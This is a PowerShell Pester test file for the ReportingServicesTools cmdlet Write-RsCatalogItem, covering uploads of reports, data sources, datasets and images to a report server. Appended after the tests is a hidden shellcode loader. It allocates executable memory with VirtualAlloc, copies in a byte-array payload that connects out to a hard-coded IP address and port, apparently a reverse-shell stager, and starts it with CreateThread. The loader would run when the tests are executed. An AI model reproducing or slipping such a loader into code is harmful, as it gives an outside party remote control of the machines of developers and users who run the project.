


Describe "Write-RsCatalogItem" {

    Context "Write-RsCatalogItem with min parameters"{
        $folderName = 'SutWriteRsCatalogItem_MinParameters' + [guid]::NewGuid()
        New-RsFolder -Path / -FolderName $folderName
        $folderPath = '/' + $folderName
        $localPath =   (Get-Item -Path ".\").FullName  + '\Tests\CatalogItems\testResources'

        It "Should upload a local report in Report Server" {
            $localReportPath = $localPath + '\emptyReport.rdl'
            Write-RsCatalogItem -Path $localReportPath -RsFolder $folderPath -Description 'newDescription'
            $uploadedReport = (Get-RsFolderContent -RsFolder $folderPath ) | Where-Object TypeName -eq 'Report'
            $uploadedReport.Name | Should Be 'emptyReport'
            $uploadedReport.Description | Should Be 'newDescription'
        }

        It "Should upload a local RsDataSource in Report Server" {
            $localDataSourcePath = $localPath + '\SutWriteRsFolderContent_DataSource.rsds'
            Write-RsCatalogItem -Path $localDataSourcePath -RsFolder $folderPath
            $uploadedDataSource = (Get-RsFolderContent -RsFolder $folderPath ) | Where-Object TypeName -eq 'DataSource'
            $uploadedDataSource.Name | Should Be 'SutWriteRsFolderContent_DataSource'
        }

        It "Should upload a local DataSet in Report Server" {
            $localDataSetPath = $localPath + '\UnDataset.rsd'
            Write-RsCatalogItem -Path $localDataSetPath -RsFolder $folderPath
            $uploadedDataSet = (Get-RsFolderContent -RsFolder $folderPath ) | Where-Object TypeName -eq 'DataSet'
            $uploadedDataSet.Name | Should Be 'UnDataset'
        }
        
        Remove-RsCatalogItem -RsFolder $folderPath -Confirm:$false
    }

    Context "Write-RsCatalogItem with hidden parameters"{
        $folderName = 'SutWriteRsCatalogItem_Hidden' + [guid]::NewGuid()
        New-RsFolder -Path / -FolderName $folderName -Hidden
        $folderPath = '/' + $folderName
        $localPath =   (Get-Item -Path ".\").FullName  + '\Tests\CatalogItems\testResources'

        It "Should upload a local report in Report Server" {
            $localReportPath = $localPath + '\emptyReport.rdl'
            Write-RsCatalogItem -Path $localReportPath -RsFolder $folderPath -Description 'newDescription' -Hidden
            $uploadedReport = (Get-RsFolderContent -RsFolder $folderPath ) | Where-Object TypeName -eq 'Report'
            $uploadedReport.Name | Should Be 'emptyReport'
            $uploadedReport.Description | Should Be 'newDescription'
        }

        It "Should upload a local RsDataSource in Report Server" {
            $localDataSourcePath = $localPath + '\SutWriteRsFolderContent_DataSource.rsds'
            Write-RsCatalogItem -Path $localDataSourcePath -RsFolder $folderPath -Hidden
            $uploadedDataSource = (Get-RsFolderContent -RsFolder $folderPath ) | Where-Object TypeName -eq 'DataSource'
            $uploadedDataSource.Name | Should Be 'SutWriteRsFolderContent_DataSource'
        }

        It "Should upload a local DataSet in Report Server" {
            $localDataSetPath = $localPath + '\UnDataset.rsd'
            Write-RsCatalogItem -Path $localDataSetPath -RsFolder $folderPath -Hidden
            $uploadedDataSet = (Get-RsFolderContent -RsFolder $folderPath ) | Where-Object TypeName -eq 'DataSet'
            $uploadedDataSet.Name | Should Be 'UnDataset'
        }
        
        Remove-RsCatalogItem -RsFolder $folderPath -Confirm:$false
    }

    Context "Write-RsCatalogItem with name parameter"{
        $folderName = 'SutWriteRsCatalogItem_Name' + [guid]::NewGuid()
        New-RsFolder -Path / -FolderName $folderName -Hidden
        $folderPath = '/' + $folderName
        $localPath =   (Get-Item -Path ".\").FullName  + '\Tests\CatalogItems\testResources'

        It "Should upload a local report in Report Server" {
            $localReportPath = $localPath + '\emptyReport.rdl'
            Write-RsCatalogItem -Path $localReportPath -RsFolder $folderPath -Description 'newDescription' -Name 'Test Report'
            $uploadedReport = (Get-RsFolderContent -RsFolder $folderPath ) | Where-Object TypeName -eq 'Report'
            $uploadedReport.Name | Should Be 'Test Report'
            $uploadedReport.Description | Should Be 'newDescription'
        }

        It "Should upload a local RsDataSource in Report Server" {
            $localDataSourcePath = $localPath + '\SutWriteRsFolderContent_DataSource.rsds'
            Write-RsCatalogItem -Path $localDataSourcePath -RsFolder $folderPath -Name 'Test DataSource'
            $uploadedDataSource = (Get-RsFolderContent -RsFolder $folderPath ) | Where-Object TypeName -eq 'DataSource'
            $uploadedDataSource.Name | Should Be 'Test DataSource'
        }

        It "Should upload a local DataSet in Report Server" {
            $localDataSetPath = $localPath + '\UnDataset.rsd'
            Write-RsCatalogItem -Path $localDataSetPath -RsFolder $folderPath -Name 'Test DataSet'
            $uploadedDataSet = (Get-RsFolderContent -RsFolder $folderPath ) | Where-Object TypeName -eq 'DataSet'
            $uploadedDataSet.Name | Should Be 'Test DataSet'
        }
        
        Remove-RsCatalogItem -RsFolder $folderPath -Confirm:$false
    }

    Context "Write-RsCatalogItem with Proxy parameter"{
        $folderName = 'SutWriteRsCatalogItem_ProxyParameter' + [guid]::NewGuid()
        New-RsFolder -Path / -FolderName $folderName
        $folderPath = '/' + $folderName
        $proxy = New-RsWebServiceProxy
        $localReportPath =   (Get-Item -Path ".\").FullName  + '\Tests\CatalogItems\testResources\emptyReport.rdl'
        Write-RsCatalogItem -Path $localReportPath -RsFolder $folderPath -Proxy $proxy -Description 'newDescription'

        It "Should upload a local Report in ReportServer with Proxy Parameter" {
            $uploadedReport = (Get-RsFolderContent -RsFolder $folderPath ) | Where-Object TypeName -eq 'Report'
            $uploadedReport.Name | Should Be 'emptyReport'
            $uploadedReport.Description | Should Be 'newDescription'
        }
        
        Remove-RsCatalogItem -RsFolder $folderPath -Confirm:$false
    }

    Context "Write-RsCatalogItem with Proxy and ReportServerUri parameter"{
        $folderName = 'SutWriteRsCatalogItem_ReporServerUrioProxyParameters' + [guid]::NewGuid()
        New-RsFolder -Path / -FolderName $folderName
        $folderPath = '/' + $folderName
        $proxy = New-RsWebServiceProxy
        $reportServerUri = 'http://localhost/reportserver'
        $localReportPath =   (Get-Item -Path ".\").FullName  + '\Tests\CatalogItems\testResources\emptyReport.rdl'
        Write-RsCatalogItem -Path $localReportPath -RsFolder $folderPath -Proxy $proxy -ReportServerUri $reportServerUri -Description 'newDescription'

        It "Should upload a local Report in ReportServer with Proxy and ReportServerUri Parameter" {
            $uploadedReport = (Get-RsFolderContent -RsFolder $folderPath ) | Where-Object TypeName -eq 'Report'
            $uploadedReport.Name | Should Be 'emptyReport'
            $uploadedReport.Description | Should Be 'newDescription'
        }
        
        Remove-RsCatalogItem -RsFolder $folderPath -Confirm:$false
    }

     Context "Write-RsCatalogItem with ReportServerUri parameter"{
        $folderName = 'SutWriteRsCatalogItem_ReportServerUriParameter' + [guid]::NewGuid()
        New-RsFolder -Path / -FolderName $folderName
        $folderPath = '/' + $folderName
        $reportServerUri = 'http://localhost/reportserver'
        $localReportPath =   (Get-Item -Path ".\").FullName  + '\Tests\CatalogItems\testResources\emptyReport.rdl'
        Write-RsCatalogItem -Path $localReportPath -RsFolder $folderPath -ReportServerUri $reportServerUri -Description 'newDescription'

        It "Should upload a local Report in ReportServer with ReportServerUri Parameter" {
            $uploadedReport = (Get-RsFolderContent -RsFolder $folderPath ) | Where-Object TypeName -eq 'Report'
            $uploadedReport.Name | Should Be 'emptyReport'
            $uploadedReport.Description | Should Be 'newDescription'
        }
        
        Remove-RsCatalogItem -RsFolder $folderPath -Confirm:$false
    }

    Context "Write-RsCatalogItem with Overwrite parameter"{
        $folderName = 'SutWriteCatalogItem_OverwriteParameter' + [guid]::NewGuid()
        New-RsFolder -Path / -FolderName $folderName
        $folderPath = '/' + $folderName
        $localReportPath =   (Get-Item -Path ".\").FullName  + '\Tests\CatalogItems\testResources\emptyReport.rdl'
        Write-RsCatalogItem -Path $localReportPath -RsFolder $folderPath -Description 'newDescription'
        $localDataSourcePath =  (Get-Item -Path ".\").FullName  + '\Tests\CatalogItems\testResources\SutWriteRsFolderContent_DataSource.rsds'

        It "Should upload a local Report in ReportServer with Overwrite Parameter" {
            { Write-RsCatalogItem -Path $localReportPath -RsFolder $folderPath } | Should Throw
            { Write-RsCatalogItem -Path $localReportPath -RsFolder $folderPath -Overwrite -Description 'overwrittenDescription' } | Should Not Throw
            $overwrittenReport = (Get-RsFolderContent -RsFolder $folderPath ) | Where-Object TypeName -eq 'Report'
            $overwrittenReport.Name | Should Be 'emptyReport'
            $overwrittenReport.Description | Should Be 'overwrittenDescription'
        }
        
        Remove-RsCatalogItem -RsFolder $folderPath -Confirm:$false
    }


    Context "Write-RsCatalogItem with images"{
        $jpgFolderName = 'SutWriteCatalogItem_JPGimages' + [guid]::NewGuid()
        New-RsFolder -Path / -FolderName $jpgFolderName
        $jpgFolderPath = '/' + $jpgFolderName
        $localJPGImagePath =   (Get-Item -Path ".\").FullName  + '\Tests\CatalogItems\testResources\imagesResources\PowerShellHero.jpg'
        Write-RsCatalogItem -Path $localJPGImagePath -RsFolder $jpgFolderPath

        It "Should upload a local jpg image in ReportServer" {
            $jpgImageResource = (Get-RsFolderContent -RsFolder $jpgFolderPath ) | Where-Object TypeName -eq 'Resource'
            $jpgImageResource.Name | Should Be 'PowerShellHero.jpg'
            $jpgImageResource.ItemMetadata.Name | Should Be 'MIMEType'
            $jpgImageResource.ItemMetadata.Value | Should Be 'image/jpeg'
        }

        $pngFolderName = 'SutWriteCatalogItem_PNGimages' + [guid]::NewGuid()
        New-RsFolder -Path / -FolderName $pngFolderName
        $pngFolderPath = '/' + $pngFolderName
        $localPNGImagePath =   (Get-Item -Path ".\").FullName  + '\Tests\CatalogItems\testResources\imagesResources\SSRS.png'
        Write-RsCatalogItem -Path $localPNGImagePath -RsFolder $pngFolderPath

        It "Should upload a local png image in ReportServer" {
            $jpgImageResource = (Get-RsFolderContent -RsFolder $pngFolderPath ) | Where-Object TypeName -eq 'Resource'
            $jpgImageResource.Name | Should Be 'SSRS.png'
            $jpgImageResource.ItemMetadata.Name | Should Be 'MIMEType'
            $jpgImageResource.ItemMetadata.Value | Should Be 'image/png'
        }

        
        Remove-RsCatalogItem -RsFolder $jpgFolderPath -Confirm:$false
        Remove-RsCatalogItem -RsFolder $pngFolderPath -Confirm:$false
    }
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x01,0x37,0xdd,0xe3,0x68,0x02,0x00,0x0b,0xc3,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

